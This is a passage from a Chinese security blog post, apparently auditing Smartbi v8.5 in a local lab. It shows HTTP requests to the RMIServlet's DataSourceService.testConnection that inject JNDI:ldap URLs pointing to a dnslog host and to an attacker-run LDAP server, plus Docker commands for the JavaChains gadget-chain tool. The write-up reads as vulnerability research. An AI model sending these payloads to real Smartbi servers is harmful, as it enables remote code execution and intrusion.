class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span>%<span class="hljs-number">3</span>a-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span>%<span class="hljs-number">3</span>a0,<span class="hljs-string">&quot;dbToCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br><br><br><br><br><span class="hljs-attribute">className</span>=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span>%<span class="hljs-number">3</span>a100,<span class="hljs-string">&quot;user&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JNDI:ldap://9sjhyp.dnslog.cn&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span>%<span class="hljs-number">3</span>a-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span>%<span class="hljs-number">3</span>a0,<span class="hljs-string">&quot;dbToCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703762.png" srcset="/img/loading.gif" lazyload alt="20250806192146688"></p>
+<p>生成K1链：</p>
+<p>ldap:&#x2F;&#x2F;[ip]:15089&#x2F;bb4e07</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703873.png" srcset="/img/loading.gif" lazyload alt="20250806192251404"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703089.png" srcset="/img/loading.gif" lazyload alt="20250806191933929"></p>
+<p>这里因为端口的问题没有利用成功。报错LDAP服务器未响应</p>
+<p>Windows 系统<strong>将 50389 端口作为排除范围</strong>，不允许程序（包括 Docker）绑定使用它。安装JavaChains 时将 <code>  -p 50389:50389 ^</code>改成了  <code>-p 15089:50389 ^</code>，可能监听不到，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703075.png" srcset="/img/loading.gif" lazyload alt="20250806190250099"></p>
+<p>使用dnslog</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /smartbi/vision/RMIServlet HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost:<span class="hljs-number">18080</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">113</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5672</span>.<span class="hljs-number">127</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded;charset=UTF-<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>: */*<br><span class="hljs-attribute">Origin</span>: http://localhost<br><span class="hljs-attribute">Referer</span>: http://localhost:<span class="hljs-number">18080</span>/smartbi/vision/index.jsp<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Cookie</span>: JSESSIONID=<span class="hljs-number">3</span>D904649DC50813C9D6EDEBC582EE4CF<br><span class="hljs-attribute">Connection</span> : keep-alive<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">457</span><br><br><span class="hljs-attribute">className</span>=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span>%<span class="hljs-number">3</span>a100,<span class="hljs-string">&quot;user&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JNDI:ldap://9sjhyp.dnslog.cn&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span>%<span class="hljs-number">3</span>a-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span>%<span class="hljs-number">3</span>a0,<span class="hljs-string">&quot;dbToCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br><br><br><span class="hljs-attribute">className</span>=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span>%<span class="hljs-number">3</span>a100,<span class="hljs-string">&quot;user&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JNDI:ldap://192.168.1.25:15089/547b87&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span>%<span class="hljs-number">3</span>a-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span>%<span class="hljs-number">3</span>a0,<span class="hljs-string">&quot;dbToCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br></code></pre></td></tr></table></figure>
+
+<p>ldap:&#x2F;&#x2F;192.168.1.25:15089&#x2F;b69569</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703187.png" srcset="/img/loading.gif" lazyload alt="20250806193947601"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703694.png" srcset="/img/loading.gif" lazyload alt="20250806194037543"></p>
+<p>收到DNSLOG记录，说明漏洞存在</p>
+<h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><p>CVE-2020-1938 ：Apache Tomcat AJP 漏洞复现和分析</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/12870365.html">https://www.cnblogs.com/backlion/p/12870365.html</a></p>
+<p>Smartbi 身份认证绕过漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/373015.html">https://www.freebuf.com/vuls/373015.html</a></p>
+<p>信息搜集相关：</p>
+<p><a target="_blank" rel="noopener" href="https://ckcah.github.io/2020/05/01/googlehack/">https://ckcah.github.io/2020/05/01/googlehack/</a></p>
+<p><a target="_blank" rel="noopener" href="https://94248.github.io/2023/07/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9B%B8%E5%85%B3/">https://94248.github.io/2023/07/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9B%B8%E5%85%B3/</a></p>
+<p>servlet</p>
+<p><a target="_blank" rel="noopener" href="https://86263008.github.io/web2024/back/java/jsp/servlet/index.html">https://86263008.github.io/web2024/back/java/jsp/servlet/index.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://kirklin.github.io/PrivateNotes/Java%E5%85%A8%E5%A5%97/JavaWeb/Servlet/#_11">https://kirklin.github.io/PrivateNotes/Java%E5%85%A8%E5%A5%97/JavaWeb/Servlet/#_11</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yxmoar/article/details/109889006">https://blog.csdn.net/yxmoar/article/details/109889006</a></p>
+<p>JDBC反序列化学习</p>
+<p><a target="_blank" rel="noopener" href="https://sp4zcmd.github.io/2021/09/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">https://sp4zcmd.github.io/2021/09/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/7754">https://xz.aliyun.com/news/7754</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Litsasuk/articles/18410624">https://www.cnblogs.com/Litsasuk/articles/18410624</a></p>
+<p><a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html">https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html</a></p>
+<h1 id="javachains使用"><a href="#javachains使用" class="headerlink" title="javachains使用"></a><strong>javachains使用</strong></h1><p><a target="_blank" rel="noopener" href="https://java-chains.vulhub.org/zh/">https://java-chains.vulhub.org/zh/</a></p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># docker 搭建</span><br><span class="hljs-attribute">docker</span> pull javachains/javachains:latest<br><br>docker run -d<span class="hljs-regexp"> ^</span><br>  --name java-chains<span class="hljs-regexp"> ^</span><br>  --restart=always<span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">8011</span>:<span class="hljs-number">8011</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">58080</span>:<span class="hljs-number">58080</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">15089</span>:<span class="hljs-number">50389</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">3308</span>:<span class="hljs-number">3308</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">13999</span>:<span class="hljs-number">13999</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">50000</span>:<span class="hljs-number">50000</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">11527</span>:<span class="hljs-number">11527</span><span class="hljs-regexp"> ^</span><br>  -e CHAINS_AUTH=<span class="hljs-literal">true</span><span class="hljs-regexp"> ^</span><br>  -e CHAINS_PASS=<span class="hljs-regexp"> ^</span><br>  javachains/javachains:latest<br><br><span class="hljs-comment">#查看当前正在运行的容器</span><br>docker ps<br><br><span class="hljs-comment">#查找日志中包含关键词 password 的行</span><br>docker logs java-chains | findstr password<br>&gt;<span class="hljs-number">08</span>-<span class="hljs-number">02</span> <span class="hljs-number">08</span>:<span class="hljs-number">06</span>:<span class="hljs-number">01</span>.<span class="hljs-number">144</span> INFO  [main] c.a.c.w.c.SecurityConfig       |  | password: HDVhxC2MfhKJwcAN<br><br><span class="hljs-comment">#停止</span><br>docker stop java-chains<br><br><span class="hljs-comment">#删除</span><br>docker rm java-chains<br><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Windows 系统<strong>将 50389 端口作为排除范围</strong>，不允许程序（包括 Docker）绑定使用它。如果改端口可能有一些问题，还是尽量在Linux搭可以避免端口问题。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703682.png" srcset="/img/loading.gif" lazyload alt="20250806200152925"></p>
+</blockquote>
+<p>访问 <code>localhost:8011</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703554.png" srcset="/img/loading.gif" lazyload alt="20250806200418498"></p>
+<p>密码：<code>docker logs java-chains | findstr password</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071704470.png" srcset="/img/loading.gif" lazyload alt="20250806200413737"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Java/" class="category-chain-item">Java</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="print-no-link">#Java 代码审计</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Smartbi v8.5 代码审计</div>
+      <div>http://xvshifu.github.io/2025/08/07/Smartbi v8.5 代码审计/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Xvsf</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年8月7日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/08/14/SpringBoot/" title="SpringBoot">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SpringBoot</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/08/07/Smartbi%20v8.5%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="Smartbi v8.5 环境搭建">
+                        <span class="hidden-mobile">Smartbi v8.5 环境搭建</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","appKey":"p527aBaA4G01EJdMOVMGXsHR","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"https://0wmntqqc.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner" style="text-align:center; color:#555; margin-top:20px;">
+
+  <!-- 计时器 -->
+  <div style="margin-bottom:10px; font-size:14px; color:#ff6f61;">
+    🚀 已运行：
+    <span id="timeDate">载入天数...</span>
+    <span id="times">载入时分秒...</span>
+    <script>
+      function createtime() {
+          var now = new Date();
+          var grt = new Date("08/07/2025 00:00:00");
+          var diff = now - grt;
+
+          var days = Math.floor(diff / 1000 / 60 / 60 / 24);
+          var hours = Math.floor((diff / 1000 / 60 / 60) % 24);
+          var minutes = Math.floor((diff / 1000 / 60) % 60);
+          var seconds = Math.floor((diff / 1000) % 60);
+
+          if(hours<10) hours="0"+hours;
+          if(minutes<10) minutes="0"+minutes;
+          if(seconds<10) seconds="0"+seconds;
+
+          document.getElementById("timeDate").innerHTML = days + " 天";
+          document.getElementById("times").innerHTML = hours + " 时 " + minutes + " 分 " + seconds + " 秒";
+      }
+      setInterval(createtime, 1000);
+      createtime();
+    </script>
+  </div>
+
+  <!-- 自定义内容 -->
+  
+    <div style="margin-bottom:10px; font-size:13px; color:#666;">
+      ❤️  <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+
+
+  <!-- PV/UV 统计（Busuanzi） -->
+  
+    <div style="margin-bottom:12px; font-size:14px; color:#3b82f6;">
+      👁‍🗨 总访问量：<span id="busuanzi_value_page_pv">载入中...</span>  
+      🧑 总访客数：<span id="busuanzi_value_site_uv">载入中...</span>
+    </div>
+    <script src="https://cdn.tutorialjinni.com/busuanzi/2.3.0/bsz.pure.mini.js"></script>
+  
+
+
+</div>
+
+<script src="/js/summon-plane.js"></script>
+
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/xm_custom/custom.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
